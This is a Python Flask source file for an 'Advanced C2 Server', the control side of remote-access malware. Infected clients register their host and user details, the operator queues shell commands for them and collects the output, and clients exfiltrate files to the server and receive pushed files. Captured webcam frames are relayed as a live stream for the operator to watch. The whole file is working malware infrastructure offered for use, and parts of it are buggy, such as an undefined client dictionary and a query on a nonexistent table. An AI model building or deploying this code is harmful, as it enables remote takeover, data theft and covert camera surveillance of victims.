#!/usr/bin/env python3
"""
Advanced C2 Server with File Transfer & Live Streaming
"""
from flask import Flask, request, jsonify, send_file, send_from_directory, Response
from flask_cors import CORS
import time
import uuid
import json
import sqlite3
import threading
import os
import io
import base64
from datetime import datetime
import mimetypes

app = Flask(__name__)
CORS(app)

# Configuration
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_DIR = os.path.join(BASE_DIR, 'uploads')
DOWNLOAD_DIR = os.path.join(BASE_DIR, 'downloads')
FRAMES_DIR = os.path.join(BASE_DIR, 'frames')
STREAMS_DIR = os.path.join(BASE_DIR, 'streams')

# Create directories
for directory in [UPLOAD_DIR, DOWNLOAD_DIR, FRAMES_DIR, STREAMS_DIR]:
    os.makedirs(directory, exist_ok=True)

# In-memory storage for live streams
active_streams = {}
camera_clients = {}

def init_db():
    """Initialize SQLite database"""
    conn = sqlite3.connect('c2.db', check_same_thread=False)
    cursor = conn.cursor()
    
    # Create clients table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            os TEXT,
            ip TEXT,
            last_seen REAL,
            status TEXT,
            camera_count INTEGER DEFAULT 0,
            has_camera BOOLEAN DEFAULT 0,
            stream_port INTEGER DEFAULT 0
        )
    ''')
    
    # Create commands table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            command TEXT,
            status TEXT,
            output TEXT,
            created_at REAL,
            completed_at REAL
        )
    ''')
    
    # Create files table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            filename TEXT,
            filepath TEXT,
            filesize INTEGER,
            uploaded_at REAL,
            downloaded_at REAL,
            is_download BOOLEAN DEFAULT 0
        )
    ''')
    
    # Create logs table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT,
            log_type TEXT,
            message TEXT,
            timestamp REAL
        )
    ''')
    
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect('c2.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def log_event(client_id, log_type, message):
    """Log events to database"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO logs (client_id, log_type, message, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (client_id, log_type, message, time.time()))
        conn.commit()
        conn.close()
    except:
        pass

@app.route('/api/checkin', methods=['POST'])
def checkin():
    """Client check-in endpoint"""
    try:
        data = request.json
        client_id = data.get('id', 'unknown')
        
        # Update client info
        clients[client_id] = {
            'hostname': data.get('hostname', 'unknown'),
            'username': data.get('username', 'unknown'),
            'os': data.get('os', 'unknown'),
            'ip': request.remote_addr,
            'last_seen': time.time(),
            'status': 'online',
            'camera_count': data.get('camera_count', 0),
            'has_camera': data.get('camera_count', 0) > 0,
            'stream_port': data.get('stream_port', 0)
        }
        
        # Update database
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO clients 
            (id, hostname, username, os, ip, last_seen, status, camera_count, has_camera, stream_port)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (client_id, 
              data.get('hostname'), 
              data.get('username'), 
              data.get('os'),
              request.remote_addr,
              time.time(),
              'online',
              data.get('camera_count', 0),
              data.get('camera_count', 0) > 0,
              data.get('stream_port', 0)))
        conn.commit()
        conn.close()
        
        log_event(client_id, 'checkin', f"Client checked in from {request.remote_addr}")
        print(f"[+] Checkin from {client_id} ({data.get('hostname')})")
        
        return jsonify({
            'status': 'ok',
            'timestamp': time.time(),
            'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }), 200
        
    except Exception as e:
        print(f"[-] Checkin error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        
        if not client_id or not command:
            return jsonify({'error': 'Missing client_id or command'}), 400
        
        cmd_id = str(uuid.uuid4())
        
        # Store in database
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (id, client_id, command, status, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (cmd_id, client_id, command, 'pending', time.time()))
        conn.commit()
        conn.close()
        
        log_event(client_id, 'command', f"Command sent: {command[:50]}")
        print(f"[+] Command sent: {cmd_id[:8]} to {client_id}: {command[:50]}")
        
        return jsonify({
            'success': True,
            'command_id': cmd_id,
            'message': 'Command queued'
        }), 200
        
    except Exception as e:
        print(f"[-] Command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/commands/<client_id>', methods=['GET'])
def get_client_commands(client_id):
    """Get pending commands for a client"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            SELECT id, command FROM commands 
            WHERE client_id = ? AND status = 'pending'
            ORDER BY created_at ASC
        ''', (client_id,))
        
        commands = []
        for row in cursor.fetchall():
            commands.append({
                'id': row['id'],
                'command': row['command']
            })
        
        # Update status to 'sent'
        cursor.execute('''
            UPDATE commands SET status = 'sent' 
            WHERE client_id = ? AND status = 'pending'
        ''', (client_id,))
        
        conn.commit()
        conn.close()
        
        return jsonify({'commands': commands}), 200
        
    except Exception as e:
        return jsonify({'commands': []}), 500

@app.route('/api/result', methods=['POST'])
def submit_result():
    """Client submits command result"""
    try:
        data = request.json
        cmd_id = data.get('command_id')
        output = data.get('output', '')
        
        if not cmd_id:
            return jsonify({'error': 'Missing command_id'}), 400
        
        # Update database
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE commands 
            SET status = 'completed', output = ?, completed_at = ?
            WHERE id = ?
        ''', (output, time.time(), cmd_id))
        
        conn.commit()
        conn.close()
        
        print(f"[+] Result received for {cmd_id[:8]}: {len(output)} chars")
        return jsonify({'success': True}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/result/<cmd_id>', methods=['GET'])
def get_command_result(cmd_id):
    """Get result for specific command"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM commands WHERE id = ?', (cmd_id,))
        
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return jsonify({
                'success': True,
                'command_id': row['id'],
                'status': row['status'],
                'output': row['output'] or '',
                'command': row['command'],
                'created_at': row['created_at']
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': 'Command not found'
            }), 404
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === FILE TRANSFER ENDPOINTS ===

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Client uploads file to server"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        client_id = request.form.get('client_id')
        filename = request.form.get('filename', file.filename)
        
        if not client_id:
            return jsonify({'error': 'No client_id provided'}), 400
        
        # Save file
        safe_filename = f"{client_id}_{int(time.time())}_{filename}"
        filepath = os.path.join(UPLOAD_DIR, safe_filename)
        file.save(filepath)
        
        # Log in database
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO files (id, client_id, filename, filepath, filesize, uploaded_at, is_download)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (str(uuid.uuid4()), client_id, filename, filepath, os.path.getsize(filepath), 
              time.time(), 0))
        conn.commit()
        conn.close()
        
        log_event(client_id, 'upload', f"File uploaded: {filename} ({os.path.getsize(filepath)} bytes)")
        print(f"[+] File uploaded from {client_id}: {filename}")
        
        return jsonify({
            'success': True,
            'filename': filename,
            'saved_as': safe_filename,
            'size': os.path.getsize(filepath)
        }), 200
        
    except Exception as e:
        print(f"[-] Upload error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/download/<client_id>/<filename>', methods=['GET'])
def download_file(client_id, filename):
    """Client downloads file from server"""
    try:
        filepath = os.path.join(DOWNLOAD_DIR, filename)
        
        if not os.path.exists(filepath):
            return jsonify({'error': 'File not found'}), 404
        
        # Log download
        log_event(client_id, 'download', f"File downloaded: {filename}")
        print(f"[+] File downloaded by {client_id}: {filename}")
        
        return send_file(
            filepath,
            as_attachment=True,
            download_name=filename,
            mimetype=mimetypes.guess_type(filename)[0] or 'application/octet-stream'
        )
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/upload', methods=['POST'])
def server_upload():
    """Server uploads file to client (for client to download)"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        client_id = request.form.get('client_id')
        target_path = request.form.get('target_path', '')
        
        if not client_id or not target_path:
            return jsonify({'error': 'Missing client_id or target_path'}), 400
        
        # Save file to downloads directory for client
        safe_filename = f"{client_id}_{int(time.time())}_{os.path.basename(target_path)}"
        filepath = os.path.join(DOWNLOAD_DIR, safe_filename)
        file.save(filepath)
        
        # Store file info for client
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO files (id, client_id, filename, filepath, filesize, uploaded_at, is_download)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (str(uuid.uuid4()), client_id, os.path.basename(target_path), 
              filepath, os.path.getsize(filepath), time.time(), 1))
        conn.commit()
        conn.close()
        
        log_event(client_id, 'server_upload', f"File queued for client: {target_path}")
        print(f"[+] File queued for {client_id}: {target_path}")
        
        return jsonify({
            'success': True,
            'message': f'File queued for {client_id}',
            'file_id': safe_filename,
            'target_path': target_path
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/list/<client_id>', methods=['GET'])
def list_files(client_id):
    """List files uploaded by client"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            SELECT id, filename, filesize, uploaded_at, is_download 
            FROM files 
            WHERE client_id = ? 
            ORDER BY uploaded_at DESC 
            LIMIT 50
        ''', (client_id,))
        
        files = []
        for row in cursor.fetchall():
            files.append({
                'id': row['id'],
                'filename': row['filename'],
                'size': row['filesize'],
                'uploaded_at': row['uploaded_at'],
                'is_download': bool(row['is_download']),
                'uploaded_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%Y-%m-%d %H:%M:%S')
            })
        
        conn.close()
        return jsonify({'files': files}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/download/<file_id>', methods=['GET'])
def download_uploaded_file(file_id):
    """Download file from server"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT filepath, filename FROM files WHERE id = ?', (file_id,))
        row = cursor.fetchone()
        conn.close()
        
        if not row:
            return jsonify({'error': 'File not found'}), 404
        
        if not os.path.exists(row['filepath']):
            return jsonify({'error': 'File missing from disk'}), 404
        
        return send_file(
            row['filepath'],
            as_attachment=True,
            download_name=row['filename']
        )
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === LIVE STREAMING ENDPOINTS ===

@app.route('/api/stream/start', methods=['POST'])
def start_stream():
    """Start live stream from client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        camera_index = data.get('camera_index', 0)
        
        if not client_id:
            return jsonify({'error': 'Missing client_id'}), 400
        
        # Generate stream ID
        stream_id = f"{client_id}_cam{camera_index}_{int(time.time())}"
        
        # Initialize stream storage
        active_streams[stream_id] = {
            'client_id': client_id,
            'camera_index': camera_index,
            'frames': [],
            'last_frame': None,
            'last_update': time.time(),
            'active': True,
            'viewers': 0
        }
        
        log_event(client_id, 'stream', f"Live stream started: camera {camera_index}")
        print(f"[+] Live stream started: {stream_id}")
        
        return jsonify({
            'success': True,
            'stream_id': stream_id,
            'message': 'Stream started'
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stream/frame', methods=['POST'])
def receive_stream_frame():
    """Receive stream frame from client"""
    try:
        data = request.form
        stream_id = data.get('stream_id')
        frame_data = data.get('frame')
        
        if not stream_id or not frame_data:
            return jsonify({'error': 'Missing data'}), 400
        
        if stream_id in active_streams:
            active_streams[stream_id]['last_frame'] = frame_data
            active_streams[stream_id]['last_update'] = time.time()
            active_streams[stream_id]['frames'].append({
                'timestamp': time.time(),
                'data': frame_data[:1000] + '...' if len(frame_data) > 1000 else frame_data
            })
            
            # Keep only last 100 frames
            if len(active_streams[stream_id]['frames']) > 100:
                active_streams[stream_id]['frames'] = active_streams[stream_id]['frames'][-100:]
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stream/<stream_id>', methods=['GET'])
def get_stream(stream_id):
    """Get MJPEG stream"""
    def generate():
        while True:
            if stream_id in active_streams:
                frame = active_streams[stream_id]['last_frame']
                if frame:
                    try:
                        # Decode base64 frame
                        img_data = base64.b64decode(frame)
                        yield (b'--frame\r\n'
                               b'Content-Type: image/jpeg\r\n\r\n' + img_data + b'\r\n')
                    except:
                        pass
            
            time.sleep(0.1)  # ~10 FPS
    
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/api/stream/status/<stream_id>', methods=['GET'])
def stream_status(stream_id):
    """Get stream status"""
    if stream_id in active_streams:
        stream = active_streams[stream_id]
        return jsonify({
            'active': stream['active'],
            'last_update': stream['last_update'],
            'viewers': stream['viewers'],
            'camera_index': stream['camera_index']
        }), 200
    else:
        return jsonify({'error': 'Stream not found'}), 404

@app.route('/api/stream/stop/<stream_id>', methods=['POST'])
def stop_stream(stream_id):
    """Stop stream"""
    if stream_id in active_streams:
        client_id = active_streams[stream_id]['client_id']
        log_event(client_id, 'stream', f"Live stream stopped: {stream_id}")
        del active_streams[stream_id]
        print(f"[-] Stream stopped: {stream_id}")
    
    return jsonify({'success': True}), 200

# === LOGS & MONITORING ===

@app.route('/api/logs/<client_id>', methods=['GET'])
def get_logs(client_id):
    """Get logs for client"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            SELECT log_type, message, timestamp 
            FROM logs 
            WHERE client_id = ? 
            ORDER BY timestamp DESC 
            LIMIT 100
        ''', (client_id,))
        
        logs = []
        for row in cursor.fetchall():
            logs.append({
                'type': row['log_type'],
                'message': row['message'],
                'timestamp': row['timestamp'],
                'time_str': datetime.fromtimestamp(row['timestamp']).strftime('%H:%M:%S')
            })
        
        conn.close()
        return jsonify({'logs': logs}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === OTHER ENDPOINTS ===

@app.route('/api/clients', methods=['GET'])
def get_clients():
    """Get all clients"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM clients ORDER BY last_seen DESC')
        
        client_list = []
        now = time.time()
        
        for row in cursor.fetchall():
            status = 'online' if (now - row['last_seen']) < 60 else 'offline'
            
            client_list.append({
                'id': row['id'],
                'hostname': row['hostname'],
                'username': row['username'],
                'os': row['os'],
                'ip': row['ip'],
                'status': status,
                'has_camera': bool(row['has_camera']),
                'camera_count': row['camera_count'],
                'last_seen': row['last_seen'],
                'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%Y-%m-%d %H:%M:%S')
            })
        
        conn.close()
        return jsonify({'clients': client_list}), 200
        
    except Exception as e:
        return jsonify({'clients': []}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get server statistics"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute("SELECT COUNT(*) FROM clients")
        total_clients = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM clients WHERE last_seen > ?", (time.time() - 60,))
        online_clients = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM commands")
        total_commands = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM files")
        total_files = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM active_streams WHERE active = 1")
        active_streams_count = len([s for s in active_streams.values() if s['active']])
        
        conn.close()
        
        return jsonify({
            'total_clients': total_clients,
            'online_clients': online_clients,
            'total_commands': total_commands,
            'total_files': total_files,
            'active_streams': active_streams_count,
            'server_time': time.time(),
            'server_uptime': time.time() - app_start_time
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health():
    """Health check"""
    return jsonify({
        'status': 'healthy',
        'timestamp': time.time(),
        'active_streams': len(active_streams)
    }), 200

@app.route('/')
def index():
    """Web interface"""
    return '''
    <html>
    <head>
        <title>C2 Server</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .card { background: #f5f5f5; padding: 20px; margin: 10px 0; border-radius: 5px; }
        </style>
    </head>
    <body>
        <h1>🎮 C2 Control Server</h1>
        <div class="card">
            <h3>Endpoints:</h3>
            <ul>
                <li><b>GET</b> /api/clients - List connected clients</li>
                <li><b>GET</b> /api/stats - Server statistics</li>
                <li><b>GET</b> /api/health - Health check</li>
                <li><b>POST</b> /api/command - Send command to client</li>
                <li><b>POST</b> /api/upload - File upload from client</li>
                <li><b>POST</b> /api/stream/start - Start live stream</li>
            </ul>
        </div>
        <p>Use the C2 console for full control.</p>
    </body>
    </html>
    '''

def cleanup():
    """Cleanup old data"""
    while True:
        time.sleep(300)
        try:
            conn = get_db()
            cursor = conn.cursor()
            
            # Clean old clients (24h)
            cursor.execute("DELETE FROM clients WHERE last_seen < ?", (time.time() - 86400,))
            
            # Clean old commands (7 days)
            cursor.execute("DELETE FROM commands WHERE created_at < ?", (time.time() - 604800,))
            
            # Clean old files (30 days)
            cursor.execute("DELETE FROM files WHERE uploaded_at < ?", (time.time() - 2592000,))
            
            # Clean old logs (7 days)
            cursor.execute("DELETE FROM logs WHERE timestamp < ?", (time.time() - 604800,))
            
            conn.commit()
            conn.close()
            
            # Clean inactive streams (5 minutes)
            current_time = time.time()
            to_remove = []
            for stream_id, stream in active_streams.items():
                if current_time - stream['last_update'] > 300:  # 5 minutes
                    to_remove.append(stream_id)
            
            for stream_id in to_remove:
                del active_streams[stream_id]
            
            print(f"[+] Cleanup completed at {datetime.now().strftime('%H:%M:%S')}")
            
        except Exception as e:
            print(f"[-] Cleanup error: {e}")

if __name__ == '__main__':
    # Initialize
    init_db()
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup, daemon=True)
    cleanup_thread.start()
    
    app_start_time = time.time()
    
    print(f"""
╔══════════════════════════════════════════════════════════╗
║               ADVANCED C2 SERVER v3.0                    ║
║             Live Streams & File Transfer                 ║
╚══════════════════════════════════════════════════════════╝
    
    📁 Uploads:   {UPLOAD_DIR}
    📂 Downloads: {DOWNLOAD_DIR}
    🎥 Streams:   Active streams in memory
    
    🔗 Endpoints:
    • POST /api/checkin        - Client registration
    • POST /api/command        - Send commands
    • POST /api/upload         - File upload
    • GET  /api/download/...   - File download
    • POST /api/stream/start   - Start live stream
    • GET  /api/stream/<id>    - View live stream (MJPEG)
    
    🚀 Starting server on http://0.0.0.0:5000
    """)
    
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
